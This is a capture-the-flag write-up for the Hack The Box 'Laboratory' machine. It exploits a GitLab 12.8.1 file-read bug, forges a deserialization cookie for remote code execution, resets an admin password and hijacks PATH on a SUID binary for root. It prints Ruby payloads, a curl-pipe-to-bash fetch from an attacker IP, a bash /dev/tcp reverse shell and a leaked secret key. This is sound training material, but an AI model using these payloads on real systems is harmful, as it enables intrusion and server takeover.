# Laboratory

## nmap -T3 -A -p- -o laboratory.nmap 10.10.10.216

[Scan result][1]

Looking at the scan results seems that there is a sub domain on git.laboratory.htb that seems a gitlab page

## Gitlab 

we can register a new account using `@laboratory.htb` as domain for email.

Searching into the repositories there is an ***SecureWebsite*** that is guaranted 100% unhackable HTML&CSS based website.

Another usefull information is the version of Gitlab in use `GitLab Community Edition 12.8.1`

`searchsploit gitlab` give an hint

```
Exploit: GitLab 12.9.0 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/48431
     Path: /usr/share/exploitdb/exploits/ruby/webapps/48431.txt
File Type: Python script, UTF-8 Unicode text executable, with CRLF line terminators
```

After more research on [Hackerone][2] we find a double exploit that can lead to RCE

To recreate this exploit we need to create two project inside gitlab and create an issue on project 1 with description:

`![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../file` moving the issue into the other project will copy ***file*** into the repositories.

at this point we can grab the `secret_key_base` from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` -> `3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3`

Next step to get RCE is to configure a local intance of gitlab `wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/ubuntu/xenial/gitlab-ce_12.8.1-ce.0_amd64.deb/download.deb` will download the installer that we need (alternatively we can run it in a docker container using this image: `gitlab/gitlab-ce:12.8.10-ce.0`).

Once installed we need to change the `secret_key_base` to match the laboratory one then run 

```bash
gitlab-ctl reconfigure
gitlab-ctl restart
gitlab-rails console 
```

Now we have to craft our cockie with reverse shell by using this template:

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```


```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `curl http://10.10.14.158:8000/rev.sh | bash` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```


Where rev.sh is:

```bash
bash -i >& /dev/tcp/10.10.14.158/9001 0>&1
```

then send the crafted cookie to the server `curl -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=$COOKIE" -k`

now we have a shell with user git.

## Priv esc from git

Launching linpeas seems we are in docker container

[Linpeas log][3]

As suggested by linpeas we can change the password of an user by using:

```bash
gitlab-rails runner 'user = User.where(id: 1).first; user.password = "zeru"; user.password_confirmation = "zeru"; user.save!'
```

Once resetted the password we can login as dexter into gitlab and get his private rsa key from the repository secure-docker.

Login via ssh and we get the user flag.

## Priv esc from dexter

Search for some SUID

```
find / -perm -4000 2>/dev/null
/usr/local/bin/docker-security
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/at
/usr/bin/umount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

`/usr/local/bin/docker-security` seems a strange file

Decompiling it with Ghidra result in 

```C
void main(void)

{
  setuid(0);
  setgid(0);
  system("chmod 700 /usr/bin/docker");
  system("chmod 660 /var/run/docker.sock");
  return;
}
```

This command calls two times system as root, the `system` calls the `execl` system call that will search `chmod` inside the `$PATH` env 
We can define a new `$PATH` in which `chmod` call bash instead of changing modes.

```C
void main(){
    system("bash");
    return;
}
```

And this give us the root.

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
![achiviement](https://www.hackthebox.eu/storage/achievements/9911ff62f77add0d0538a37385cfc9e3.png)

[//]: #links
[1]: laboratory.nmap
[2]: https://hackerone.com/reports/827052
[3]: linpeas.txt
